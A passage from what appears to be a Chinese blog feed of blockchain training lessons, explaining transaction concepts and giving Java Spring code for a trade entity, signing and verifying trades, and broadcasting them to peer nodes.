where [orderNo]=?&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt; tradeNos.size(); i++) &#123;</span><br><span class="line">                System.out.println(tradeNos.get(i));</span><br><span class="line">                statement.setString(<span class="number">1</span>, tradeNos.get(i));</span><br><span class="line">                statement.addBatch();</span><br><span class="line">                <span class="keyword">if</span>(i % <span class="number">100</span> ==<span class="number">0</span>) &#123;</span><br><span class="line">                    statement.executeBatch();</span><br><span class="line">                    statement.clearBatch();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            statement.executeBatch();</span><br><span class="line">            statement.clearBatch();</span><br><span class="line">            connection.commit();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(connection != <span class="literal">null</span>) &#123;</span><br><span class="line">                    connection.rollback();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e1) &#123;</span><br><span class="line">                e.getMessage();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            SQLiteHelper.close(connection);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-5-发送交易"><a href="#2-5-发送交易" class="headerlink" title="2.5. 发送交易"></a>2.5. 发送交易</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/data/trade&quot;, method = &#123;RequestMethod.POST&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">trade</span><span class="params">(<span class="meta">@RequestBody</span> TradeObject tradeObject)</span> &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        List&lt;Pending&gt; pes = PendingServiceImpl.queryPendings();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">no</span> <span class="operator">=</span> PendingServiceImpl.genTradeNo(tradeObject);</span><br><span class="line">        tradeObject.setHashNo(no);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">genTradeNo</span> <span class="operator">=</span> PendingServiceImpl.genTradeNo(tradeObject);</span><br><span class="line">        <span class="keyword">for</span> (Pending p : pes) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.getOrderNo().equals(genTradeNo)) &#123;</span><br><span class="line">                jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">                jo.setMsg(<span class="string">&quot;交易已存在&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//验证钱包地址</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().toJson(tradeObject);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PendingServiceImpl.validateTradeNo(tradeObject);</span><br><span class="line">            <span class="type">Pending</span> <span class="variable">pending</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pending</span>();</span><br><span class="line">            pending.setTradeBody(body);</span><br><span class="line">            pending.setCreateTime(tradeObject.getJsoncreatetime());</span><br><span class="line">            pending.setOrderNo(tradeObject.getHashNo());</span><br><span class="line">            pending.setTradeType(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            PendingServiceImpl.save(pending);</span><br><span class="line">            <span class="keyword">for</span> (String port : map.getFs().keySet()) &#123;</span><br><span class="line">                <span class="type">Friends</span> <span class="variable">f</span> <span class="operator">=</span> map.getFs().get(port);</span><br><span class="line">                <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> f.getIp();</span><br><span class="line">                <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;:8001/data/trade&quot;</span>;</span><br><span class="line">                restTemplate.postForEntity(url, tradeObject, TradeObject.class);</span><br><span class="line">            &#125;</span><br><span class="line">            jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>区块链</category>
      </categories>
  </entry>
  <entry>
    <title>区块链实训5</title>
    <url>/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD5.html</url>
    <content><![CDATA[<p>了解区块链中的交易，了解智能合约的使用</p>
<span id="more"></span>

<h2 id="第一部分：区块链中的交易"><a href="#第一部分：区块链中的交易" class="headerlink" title="第一部分：区块链中的交易"></a>第一部分：区块链中的交易</h2><h3 id="1-交易的概念"><a href="#1-交易的概念" class="headerlink" title="1. 交易的概念"></a>1. 交易的概念</h3><p>在区块链中，交易是指两方之间价值的转移。这可以是货币、资产或数据的交换。交易的基本概念建立在信任与透明的基础上，通过区块链的分布式账本，所有参与者都可以验证交易的有效性，确保没有人能篡改历史记录。这种机制使得区块链特别适用于金融系统和需要去中心化信任的场景。</p>
<h3 id="2-交易的组成部分"><a href="#2-交易的组成部分" class="headerlink" title="2. 交易的组成部分"></a>2. 交易的组成部分</h3><p>每笔交易由以下几个主要组成部分构成：</p>
<ul>
<li><strong>金额（Amount）</strong>：表示转账的具体数量。</li>
<li><strong>交易ID</strong>：为每笔交易生成的唯一标识符，用于区分不同的交易。（hashNo）</li>
<li><strong>时间戳</strong>：记录交易的创建时间，确保时间线的透明性。</li>
</ul>
<h3 id="3-交易的生命周期"><a href="#3-交易的生命周期" class="headerlink" title="3. 交易的生命周期"></a>3. 交易的生命周期</h3><p>交易的生命周期包括多个关键步骤：</p>
<ol>
<li><strong>创建交易</strong>：用户通过钱包软件输入交易的基本信息（接收方地址、金额等），并生成交易。</li>
<li><strong>签名</strong>：交易使用用户的私钥进行数字签名，以证明其合法性。</li>
<li><strong>广播</strong>：交易被发送到区块链网络，所有节点接收到该交易信息。</li>
<li><strong>验证</strong>：节点验证交易的有效性，包括检查输入是否有效、签名是否正确等。</li>
<li><strong>打包</strong>：经过验证的交易被矿工打包成区块，并与其他交易一起处理。</li>
<li><strong>确认</strong>：矿工通过工作量证明等机制确认区块，交易被写入区块链。</li>
<li><strong>最终性</strong>：交易一旦被多个区块确认后，便被认为是不可更改的，完成整个交易流程。</li>
</ol>
<h3 id="4-交易实体类"><a href="#4-交易实体类" class="headerlink" title="4. 交易实体类"></a>4. 交易实体类</h3><p>项目地址：<code>https://gitee.com/daitoulin/block_contract.git</code></p>
<p>实体类路径：<code>block_contract/src/main/java/com/example/blockchain/entity/TradeObject.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.blockchain.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TradeObject</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String from;</span><br><span class="line">    <span class="keyword">private</span> String to;</span><br><span class="line">    <span class="keyword">private</span> String hashNo;</span><br><span class="line">    <span class="keyword">private</span> String type;</span><br><span class="line">    <span class="keyword">private</span> String imgUrl;</span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line">    <span class="keyword">private</span> String blockIndex;</span><br><span class="line">    <span class="keyword">private</span> String contentjson;</span><br><span class="line">    <span class="keyword">private</span> String jsoncreatetime;</span><br><span class="line">    <span class="keyword">private</span> String uId;</span><br><span class="line">    <span class="keyword">private</span> String annexPath;</span><br><span class="line">    <span class="keyword">private</span> String filePath;</span><br><span class="line">    <span class="keyword">private</span> String blockHash;</span><br><span class="line">    <span class="keyword">private</span> String createTime;</span><br><span class="line">    <span class="keyword">private</span> String sign;</span><br><span class="line">    <span class="keyword">private</span> String contractContent;</span><br><span class="line">    <span class="keyword">private</span> String paramStr;</span><br><span class="line">    <span class="keyword">private</span> String lastData;</span><br><span class="line">    <span class="keyword">private</span> String objToString;</span><br><span class="line">    <span class="keyword">private</span> String dataStr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;TradeObject&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;from=&#x27;&quot;</span> + from + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, to=&#x27;&quot;</span> + to + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, type=&#x27;&quot;</span> + type + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, imgUrl=&#x27;&quot;</span> + imgUrl + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, content=&#x27;&quot;</span> + content + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, blockIndex=&#x27;&quot;</span> + blockIndex + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, contentjson=&#x27;&quot;</span> + contentjson + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, jsoncreatetime=&#x27;&quot;</span> + jsoncreatetime + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, uId=&#x27;&quot;</span> + uId + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, annexPath=&#x27;&quot;</span> + annexPath + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, filePath=&#x27;&quot;</span> + filePath + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, contractContent=&#x27;&quot;</span> + contractContent + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, paramStr=&#x27;&quot;</span> + paramStr + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, lastData=&#x27;&quot;</span> + lastData + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFrom</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> from;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFrom</span><span class="params">(String from)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.from = from;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> to;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTo</span><span class="params">(String to)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.to = to;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHashNo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hashNo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHashNo</span><span class="params">(String hashNo)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hashNo = hashNo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setType</span><span class="params">(String type)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getImgUrl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> imgUrl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setImgUrl</span><span class="params">(String imgUrl)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.imgUrl = imgUrl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getContent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setContent</span><span class="params">(String content)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBlockIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> blockIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBlockIndex</span><span class="params">(String blockIndex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.blockIndex = blockIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getContentjson</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> contentjson;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setContentjson</span><span class="params">(String contentjson)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.contentjson = contentjson;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getJsoncreatetime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> jsoncreatetime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setJsoncreatetime</span><span class="params">(String jsoncreatetime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jsoncreatetime = jsoncreatetime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getuId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> uId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setuId</span><span class="params">(String uId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uId = uId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAnnexPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> annexPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAnnexPath</span><span class="params">(String annexPath)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.annexPath = annexPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFilePath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> filePath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFilePath</span><span class="params">(String filePath)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.filePath = filePath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBlockHash</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> blockHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBlockHash</span><span class="params">(String blockHash)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.blockHash = blockHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCreateTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCreateTime</span><span class="params">(String createTime)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.createTime = createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSign</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sign;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSign</span><span class="params">(String sign)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sign = sign;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getContractContent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> contractContent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setContractContent</span><span class="params">(String contractContent)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.contractContent = contractContent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getParamStr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> paramStr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParamStr</span><span class="params">(String paramStr)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.paramStr = paramStr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLastData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> lastData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLastData</span><span class="params">(String lastData)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.lastData = lastData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getObjToString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> objToString;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setObjToString</span><span class="params">(String objToString)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.objToString = objToString;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDataStr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dataStr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataStr</span><span class="params">(String dataStr)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataStr = dataStr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-交易相关接口"><a href="#5-交易相关接口" class="headerlink" title="5. 交易相关接口"></a>5. 交易相关接口</h3><ol>
<li><p>获取交易实体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/data/getTradeObject&quot;, method = &#123;RequestMethod.POST&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">getTradeObject</span><span class="params">(<span class="meta">@RequestBody</span> TradeBO tradeBO)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(tradeBO.getContent()) || tradeBO.getContent() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;交易content值不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(tradeBO.getFrom()) || tradeBO.getFrom() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;交易from值不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(tradeBO.getPrivateKey()) || tradeBO.getPrivateKey() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;私钥privateKey不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">BigInteger</span> <span class="variable">pri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(tradeBO.getPrivateKey(), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TradeObject</span> <span class="variable">tradeObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TradeObject</span>();</span><br><span class="line">        tradeObject.setFrom(tradeBO.getFrom());</span><br><span class="line">        tradeObject.setTo(<span class="string">&quot;system&quot;</span>);</span><br><span class="line">        tradeObject.setType(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        tradeObject.setContent(tradeBO.getContent());</span><br><span class="line">        tradeObject.setJsoncreatetime(DateUtils.getTime());</span><br><span class="line">        tradeObject.setObjToString(tradeObject.toString());</span><br><span class="line"></span><br><span class="line">        Sign.<span class="type">SignatureData</span> <span class="variable">signatureData</span> <span class="operator">=</span> EthUtils.signMessage(tradeObject.toString(),pri);</span><br><span class="line">        <span class="type">String</span> <span class="variable">sign</span> <span class="operator">=</span> EthUtils.getSignStr(signatureData);</span><br><span class="line">        tradeObject.setSign(sign);</span><br><span class="line"></span><br><span class="line">        jo.setO(tradeObject);</span><br><span class="line">        jo.setMsg(<span class="string">&quot;签名成功&quot;</span>);</span><br><span class="line">        jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>交易接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/data/trade&quot;, method = &#123;RequestMethod.POST&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;JSONObject&gt; <span class="title function_">trade</span><span class="params">(<span class="meta">@RequestBody</span> TradeObject tradeObject)</span> &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        List&lt;Pending&gt; pes = PendingServiceImpl.queryPendings();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(tradeObject.getFrom()) || tradeObject.getFrom() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;交易from值不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;&quot;</span>.equals(tradeObject.getTo()) || tradeObject.getTo() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;交易to值不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(tradeObject.getObjToString()) || tradeObject.getObjToString() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;交易objToString值不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(tradeObject.getSign()) || tradeObject.getSign() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;交易sign值不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(tradeObject.getType()) || tradeObject.getType() == <span class="literal">null</span>)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;交易type值不能为空&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">no</span> <span class="operator">=</span> PendingServiceImpl.genTradeNo(tradeObject);</span><br><span class="line">        tradeObject.setHashNo(no);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Pending p : pes) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.getOrderNo().equals(no)) &#123;</span><br><span class="line">                jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">                jo.setMsg(<span class="string">&quot;交易已存在&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Sign.<span class="type">SignatureData</span> <span class="variable">signatureData</span> <span class="operator">=</span> EthUtils.stringToSignatureData(tradeObject.getSign());</span><br><span class="line">        <span class="comment">//验证钱包地址</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isValid</span> <span class="operator">=</span> EthUtils.verifySignature(tradeObject.getObjToString(), signatureData, tradeObject.getFrom());</span><br><span class="line">        <span class="keyword">if</span> (!isValid)&#123;</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;验签失败，请重新签名&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span 